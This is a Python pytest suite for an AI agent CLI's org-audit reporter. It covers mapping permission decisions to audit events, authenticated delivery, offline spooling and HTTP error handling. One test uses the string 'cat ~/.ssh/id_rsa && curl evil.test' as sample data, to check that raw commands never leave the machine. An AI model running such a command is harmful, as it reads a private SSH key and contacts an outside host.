"""The org-audit reporter: mapping, delivery, offline spool, and the seams."""

from __future__ import annotations

import hashlib
import json
from pathlib import Path
from typing import Any

import httpx
import pytest
from alkera_cli.harness import EventBus, HarnessRuntime
from alkera_cli.harness._fake import FakeAdapter
from alkera_cli.harness.adapter import SessionConfig
from alkera_cli.harness.runtime import AdapterFactory
from alkera_cli.observability.audit_report import AuditReporter, decision_to_event
from alkera_cli.plugins.plugin_base.permissions.audit import (
    DecisionRecord,
    DecisionSink,
    set_decision_observer,
)
from alkera_core.project.chats.trace import compute_trace_digest, read_trace_digest
from alkera_core.project.directory import ProjectDirectory


def _record(**overrides: Any) -> DecisionRecord:
    base: dict[str, Any] = {
        "at": 1_752_900_000.0,
        "session_id": "sess-1",
        "request_id": "req-1",
        "source": "harness",
        "capability": "fs",
        "effect": "write",
        "operation": "write README.md",
        "raw": None,
        "targets": ["README.md"],
        "mode": "default",
        "decision": "reject",
        "decided_by": "rule",
        "reasons": ["disallowed by policy"],
    }
    base.update(overrides)
    return DecisionRecord(**base)


class _Capture:
    """A MockTransport handler that records every request and answers with a
    scripted status per call (the last status repeats)."""

    def __init__(self, *statuses: int) -> None:
        self.statuses = list(statuses) or [201]
        self.requests: list[dict[str, Any]] = []
        self.headers: list[httpx.Headers] = []

    def __call__(self, request: httpx.Request) -> httpx.Response:
        status = self.statuses.pop(0) if len(self.statuses) > 1 else self.statuses[0]
        if status == 0:
            raise httpx.ConnectError("backend down", request=request)
        self.requests.append(json.loads(request.content.decode()))
        self.headers.append(request.headers)
        return httpx.Response(status, json={"accepted": len(self.requests[-1]["events"])})


def _reporter(tmp_path: Path, capture: _Capture, *, token: str | None = "tok") -> AuditReporter:
    return AuditReporter(
        api_url="http://backend.test",
        token_provider=lambda: token,
        spool_path=tmp_path / "spool.jsonl",
        transport=httpx.MockTransport(capture),
        start_worker=False,
    )


def _sent_events(capture: _Capture) -> list[dict[str, Any]]:
    return [e for r in capture.requests for e in r["events"]]


def test_reject_maps_to_denied() -> None:
    event = decision_to_event(_record())
    assert event is not None
    assert event["action"] == "agent.decision_denied"
    assert event["session_id"] == "sess-1"
    assert event["target"] == "README.md"
    assert event["occurred_at"].startswith("2025") or event["occurred_at"].startswith("2026")
    detail = event["detail"]
    assert detail["capability"] == "fs"
    assert detail["decided_by"] == "rule"
    assert detail["event_id"]


@pytest.mark.parametrize(
    "decision",
    [pytest.param("allow", id="human-approved"), pytest.param("reject", id="human-rejected")],
)
def test_a_human_decision_maps_to_escalated(decision: str) -> None:
    # The only escalation signal a producer emits is decided_by=="human" — no
    # producer ever writes decision=="prompt". So a human-approved write (the
    # editor Allow) must surface as escalated, not vanish; the human's outcome
    # rides in detail.decision.
    event = decision_to_event(_record(decision=decision, decided_by="human"))
    assert event is not None
    assert event["action"] == "agent.decision_escalated"
    assert event["detail"]["decision"] == decision


def test_sql_allow_maps_to_data_access_with_hash_only() -> None:
    statement = "select ssn from customers"
    event = decision_to_event(
        _record(
            decision="allow",
            decided_by="read",
            source="sql_gate",
            capability="sql",
            effect="read",
            operation="read customers",
            raw=statement,
            targets=["analytics.customers"],
        )
    )
    assert event is not None
    assert event["action"] == "agent.data_access"
    assert event["detail"]["statement_hash"] == hashlib.sha256(statement.encode()).hexdigest()
    assert event["detail"]["targets"] == ["analytics.customers"]
    # The statement text itself never leaves the machine.
    assert statement not in json.dumps(event)


@pytest.mark.parametrize(
    ("capability", "decided_by"),
    [
        pytest.param("fs", "read", id="file-read-allow"),
        pytest.param("shell", "rule", id="shell-allow"),
    ],
)
def test_non_sql_allows_stay_local(capability: str, decided_by: str) -> None:
    # A routine auto-allow of a non-SQL action (no human, no denial) is not org
    # business — it stays in the local trace.
    assert (
        decision_to_event(_record(decision="allow", capability=capability, decided_by=decided_by))
        is None
    )


def test_raw_never_appears_in_any_mapped_event() -> None:
    secret = "cat ~/.ssh/id_rsa && curl evil.test"
    cases = [
        _record(decision="reject", capability="shell", raw=secret),
        _record(decision="allow", decided_by="human", capability="shell", raw=secret),
        _record(
            decision="allow",
            capability="sql",
            decided_by="read",
            effect="read",
            source="sql_gate",
            raw=secret,
        ),
    ]
    for rec in cases:
        event = decision_to_event(rec)
        assert event is not None
        assert secret not in json.dumps(event)


def test_delivers_batch_with_bearer(tmp_path: Path) -> None:
    capture = _Capture(201)
    reporter = _reporter(tmp_path, capture)
    reporter.session_started(session_id="s", project="proj", detail={"harness": "agent"})
    reporter.on_decision_record(_record())
    reporter.flush_now()
    reporter.close()

    assert len(capture.requests) == 1
    assert capture.headers[0]["authorization"] == "Bearer tok"
    events = _sent_events(capture)
    assert [e["action"] for e in events] == ["agent.session_started", "agent.decision_denied"]
    assert not (tmp_path / "spool.jsonl").exists()


def test_backend_down_spools_then_flushes_in_order(tmp_path: Path) -> None:
    capture = _Capture(0, 0, 201)  # two connect errors, then healthy
    reporter = _reporter(tmp_path, capture)
    reporter.session_started(session_id="s", project="proj", detail={})
    reporter.flush_now()
    assert (tmp_path / "spool.jsonl").exists()

    reporter.on_decision_record(_record())
    reporter.flush_now()  # still down; both events spool
    spooled = (tmp_path / "spool.jsonl").read_text().strip().splitlines()
    assert len(spooled) == 2

    reporter.flush_now()  # backend back; spool drains oldest first
    actions = [e["action"] for e in _sent_events(capture)]
    assert actions == ["agent.session_started", "agent.decision_denied"]
    assert not (tmp_path / "spool.jsonl").exists()
    reporter.close()


def test_no_token_spools_without_a_request(tmp_path: Path) -> None:
    capture = _Capture(201)
    reporter = _reporter(tmp_path, capture, token=None)
    reporter.on_decision_record(_record())
    reporter.flush_now()
    reporter.close()
    assert capture.requests == []
    assert (tmp_path / "spool.jsonl").exists()


def test_unauthorized_spools_for_after_relogin(tmp_path: Path) -> None:
    capture = _Capture(401)
    reporter = _reporter(tmp_path, capture)
    reporter.on_decision_record(_record())
    reporter.flush_now()
    reporter.close()
    assert (tmp_path / "spool.jsonl").exists()


def _token_reporter(tmp_path: Path, capture: _Capture, token: dict[str, str]) -> AuditReporter:
    return AuditReporter(
        api_url="http://backend.test",
        token_provider=lambda: token["value"],
        spool_path=tmp_path / "spool.jsonl",
        transport=httpx.MockTransport(capture),
        start_worker=False,
    )


def test_not_entitled_drops_everything_and_goes_silent(tmp_path: Path) -> None:
    # A non-Enterprise org's daemon learns its entitlement from ONE refused
    # batch, then sends nothing and stores nothing — no probing, no dead spool.
    capture = _Capture(403)
    reporter = _reporter(tmp_path, capture)
    reporter.on_decision_record(_record())
    reporter.flush_now()
    reporter.on_decision_record(_record(request_id="req-2"))
    reporter.flush_now()
    reporter.flush_now()
    reporter.close()
    assert len(capture.requests) == 1
    assert not (tmp_path / "spool.jsonl").exists()


class _Refusal:
    """Answers one 403 carrying ``body``, then 201 for anything after it."""

    def __init__(self, body: Any) -> None:
        self.body = body
        self.calls = 0

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.calls += 1
        if self.calls == 1:
            return httpx.Response(403, json=self.body)
        return httpx.Response(201, json={"accepted": 0})


@pytest.mark.parametrize(
    ("body", "expected"),
    [
        pytest.param(
            {"error": {"code": "org_member_required", "message": "no"}},
            "org_member_required",
            id="envelope-code",
        ),
        pytest.param(
            {"detail": {"code": "email_verification_required", "message": "no"}},
            "email_verification_required",
            id="bare-detail-code",
        ),
        pytest.param({"detail": "insufficient permissions"}, "forbidden", id="unnamed-string"),
        pytest.param(["nonsense"], "forbidden", id="not-an-object"),
    ],
)
def test_a_refusal_says_which_one_it_was(
    tmp_path: Path, caplog: pytest.LogCaptureFixture, body: Any, expected: str
) -> None:
    """A 403 on the ingest is several different things — the member row behind
    this token is gone, the account was never verified — and the box's log is
    the only place anyone finds out which."""
    reporter = AuditReporter(
        api_url="http://backend.test",
        token_provider=lambda: "tok",
        spool_path=tmp_path / "spool.jsonl",
        transport=httpx.MockTransport(_Refusal(body)),
        start_worker=False,
    )
    reporter.on_decision_record(_record())
    with caplog.at_level("INFO", logger="alkera_cli.observability.audit_report"):
        reporter.flush_now()
    reporter.close()
    (line,) = [r.getMessage() for r in caplog.records if "org audit reporting refused" in r.message]
    assert expected in line


def test_relogin_reprobes_after_an_entitlement_refusal(tmp_path: Path) -> None:
    capture = _Capture(403, 201)
    token = {"value": "before-upgrade"}
    reporter = _token_reporter(tmp_path, capture, token)
    reporter.on_decision_record(_record())
    reporter.flush_now()  # refused; the batch and spool are dropped
    reporter.on_decision_record(_record(request_id="req-lost"))
    reporter.flush_now()  # same token: silence, and nothing accumulates
    assert len(capture.requests) == 1
    token["value"] = "after-upgrade"
    reporter.on_decision_record(_record(request_id="req-kept"))
    reporter.flush_now()  # a fresh credential probes again and delivers
    reporter.close()
    assert len(capture.requests) == 2
    assert capture.headers[-1]["authorization"] == "Bearer after-upgrade"
    assert [e["detail"]["request_id"] for e in capture.requests[-1]["events"]] == ["req-kept"]
    assert not (tmp_path / "spool.jsonl").exists()


def test_expired_token_holds_the_trail_until_relogin(tmp_path: Path) -> None:
    # 401 is an identity fault in an entitled org: the trail is owed, so it
    # spools — but the dead credential is never retried.
    capture = _Capture(401, 201)
    token = {"value": "expired"}
    reporter = _token_reporter(tmp_path, capture, token)
    reporter.on_decision_record(_record())
    reporter.flush_now()  # refused once
    reporter.on_decision_record(_record(request_id="req-2"))
    reporter.flush_now()  # same token: no request, both events held
    assert len(capture.requests) == 1
    assert len((tmp_path / "spool.jsonl").read_text().splitlines()) == 2
    token["value"] = "fresh"
    reporter.flush_now()  # re-login delivers the whole held trail, oldest first
    reporter.close()
    assert len(capture.requests) == 2
    assert [e["detail"]["request_id"] for e in capture.requests[-1]["events"]] == ["req-1", "req-2"]
    assert not (tmp_path / "spool.jsonl").exists()


def test_transient_server_errors_keep_the_fast_retry(tmp_path: Path) -> None:
    capture = _Capture(500)
    reporter = _reporter(tmp_path, capture)
    reporter.on_decision_record(_record())
    reporter.flush_now()
    reporter.flush_now()
    reporter.close()
    assert len(capture.requests) >= 2  # an outage is transient; no pause applies


def test_poison_batch_is_dropped_not_wedged(tmp_path: Path) -> None:
    capture = _Capture(422)
    reporter = _reporter(tmp_path, capture)
    reporter.on_decision_record(_record())
    reporter.flush_now()
    reporter.close()
    assert len(capture.requests) == 1
    assert not (tmp_path / "spool.jsonl").exists()


def test_spool_overflow_drops_oldest_and_records_a_gap(tmp_path: Path) -> None:
    capture = _Capture(0)  # permanently down
    reporter = AuditReporter(
        api_url="http://backend.test",
        token_provider=lambda: "tok",
        spool_path=tmp_path / "spool.jsonl",
        transport=httpx.MockTransport(capture),
        start_worker=False,
        spool_max_events=5,
    )
    for index in range(8):
        reporter.session_started(session_id=f"s{index}", project="proj", detail={})
    reporter.flush_now()
    reporter.close()

    lines = [json.loads(line) for line in (tmp_path / "spool.jsonl").read_text().splitlines()]
    assert len(lines) == 5  # gap marker + the 4 newest, never over spool_max
    assert lines[0]["action"] == "agent.audit_gap"
    assert lines[0]["detail"]["dropped"] == 4
    assert [e["session_id"] for e in lines[1:]] == ["s4", "s5", "s6", "s7"]


def test_spool_overflow_is_stable_across_failed_retries(tmp_path: Path) -> None:
    """A retry cycle against a still-dead backend must not erode the spool
    further or forget how many events the gap swallowed."""
    capture = _Capture(0)
    reporter = AuditReporter(
        api_url="http://backend.test",
        token_provider=lambda: "tok",
        spool_path=tmp_path / "spool.jsonl",
        transport=httpx.MockTransport(capture),
        start_worker=False,
        spool_max_events=5,
    )
    for index in range(8):
        reporter.session_started(session_id=f"s{index}", project="proj", detail={})
    for _ in range(4):  # first write + three failed retry cycles
        reporter.flush_now()
    reporter.close()

    lines = [json.loads(line) for line in (tmp_path / "spool.jsonl").read_text().splitlines()]
    assert len(lines) == 5
    assert lines[0]["detail"]["dropped"] == 4
    assert [e["session_id"] for e in lines[1:]] == ["s4", "s5", "s6", "s7"]


def test_observer_feeds_reporter_from_a_real_sink(tmp_path: Path) -> None:
    capture = _Capture(201)
    reporter = _reporter(tmp_path, capture)
    sink = DecisionSink(tmp_path / "chat")
    set_decision_observer(reporter.on_decision_record)
    try:
        sink.record(_record())
        sink.record(_record(decision="allow", capability="fs", decided_by="read"))
    finally:
        set_decision_observer(None)
    reporter.flush_now()
    reporter.close()

    actions = [e["action"] for e in _sent_events(capture)]
    assert actions == ["agent.decision_denied"]  # the routine allow stayed local
    assert len(sink.read()) == 2  # both landed in the local trace regardless


def test_observer_failure_never_breaks_the_decision_path(tmp_path: Path) -> None:
    def boom(_rec: DecisionRecord) -> None:
        raise RuntimeError("reporter exploded")

    sink = DecisionSink(tmp_path / "chat")
    set_decision_observer(boom)
    try:
        sink.record(_record())  # must not raise
    finally:
        set_decision_observer(None)
    assert len(sink.read()) == 1


class _FakeFactory(AdapterFactory):
    def __init__(self) -> None:
        super().__init__(binary=None)

    def __call__(  # type: ignore[override]
        self,
        config: SessionConfig,
        *,
        bus: EventBus,
        harness_type: str = "agent",
    ) -> FakeAdapter:
        adapter = FakeAdapter()
        adapter._bus = bus
        adapter._harness_type = harness_type
        return adapter


@pytest.mark.asyncio
async def test_runtime_emits_session_started_and_finished(tmp_path: Path) -> None:
    capture = _Capture(201)
    reporter = _reporter(tmp_path, capture)
    runtime = HarnessRuntime(
        ProjectDirectory(tmp_path / "work" / ".alkera"),
        adapter_factory=_FakeFactory(),
        audit_reporter=reporter,
    )
    session = await runtime.open_chat(create=True)
    await runtime.close_chat(session.session_id)
    reporter.flush_now()
    reporter.close()

    events = _sent_events(capture)
    by_action = {e["action"]: e for e in events}
    started = by_action["agent.session_started"]
    finished = by_action["agent.session_finished"]
    assert started["target"] == "work"
    assert started["detail"]["resumed"] is False
    assert started["session_id"] == session.session_id
    assert finished["detail"]["queries"] == 0
    assert finished["detail"]["duration_seconds"] >= 0
    # The emitted trace_hash is not just "some 64-hex string" — it must be the
    # digest actually pinned for THIS session, so an auditor can verify a trace
    # against the record. A stale or wrong-session hash would break that link.
    chat_dir = tmp_path / "work" / ".alkera" / "chats" / session.session_id
    assert (chat_dir / "trace.digest.json").is_file()
    pinned = read_trace_digest(chat_dir)
    assert pinned is not None
    trace_hash = finished["detail"]["trace_hash"]
    assert trace_hash == pinned.combined
    assert trace_hash == compute_trace_digest(chat_dir, session.session_id).combined
    # No warehouse activity, so no cost event.
    assert "agent.cost" not in by_action


def test_gap_count_folds_forward_across_stacked_overflows(tmp_path: Path) -> None:
    capture = _Capture(0)
    reporter = AuditReporter(
        api_url="http://backend.test",
        token_provider=lambda: "tok",
        spool_path=tmp_path / "spool.jsonl",
        transport=httpx.MockTransport(capture),
        start_worker=False,
        spool_max_events=5,
    )
    for index in range(8):
        reporter.session_started(session_id=f"s{index}", project="proj", detail={})
    reporter.flush_now()
    for index in range(4):
        reporter.session_started(session_id=f"n{index}", project="proj", detail={})
    reporter.flush_now()
    reporter.close()

    lines = [json.loads(line) for line in (tmp_path / "spool.jsonl").read_text().splitlines()]
    assert len(lines) == 5
    assert lines[0]["action"] == "agent.audit_gap"
    assert lines[0]["detail"]["dropped"] == 8  # first marker's 4 folded into the second trim
    assert [e["session_id"] for e in lines[1:]] == ["n0", "n1", "n2", "n3"]


def test_lock_held_requeues_instead_of_losing(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    import alkera_cli.observability.audit_report as audit_report_module
    from alkera_core.project.locking import FileLock, retrying_lock

    monkeypatch.setattr(audit_report_module, "_LOCK_TIMEOUT_SECONDS", 0.1)
    capture = _Capture(201)
    reporter = _reporter(tmp_path, capture)
    reporter.session_started(session_id="s", project="proj", detail={})
    (tmp_path).mkdir(exist_ok=True)
    with retrying_lock(FileLock(tmp_path / ".spool.lock"), timeout_seconds=1):
        reporter.flush_now()
    assert capture.requests == []
    assert not (tmp_path / "spool.jsonl").exists()
    reporter.flush_now()  # lock released; the requeued event now delivers
    assert [e["action"] for e in _sent_events(capture)] == ["agent.session_started"]
    reporter.close()


def test_session_cost_reports_charged_usd_by_connection(tmp_path: Path) -> None:
    capture = _Capture(201)
    reporter = _reporter(tmp_path, capture)
    reporter.session_cost(
        session_id="sess-1", connection_usd={"snowflake": 1.5, "duckdb": 0.25}, total_usd=1.75
    )
    reporter.flush_now()
    reporter.close()

    (event,) = _sent_events(capture)
    assert event["action"] == "agent.cost"
    assert event["session_id"] == "sess-1"
    assert event["target"] == "snowflake"  # the top-spend connection
    assert event["detail"]["by_connection"] == {"snowflake": 1.5, "duckdb": 0.25}
    assert event["detail"]["total_usd"] == 1.75


def test_server_error_spools_then_redelivers(tmp_path: Path) -> None:
    capture = _Capture(500, 201)
    reporter = _reporter(tmp_path, capture)
    reporter.on_decision_record(_record())
    reporter.flush_now()
    assert (tmp_path / "spool.jsonl").exists()  # a transient 5xx must not drop

    reporter.flush_now()
    reporter.close()
    first, second = _sent_events(capture)  # the 500 attempt and its retry
    assert first["detail"]["event_id"] == second["detail"]["event_id"]
    assert second["action"] == "agent.decision_denied"
    assert not (tmp_path / "spool.jsonl").exists()
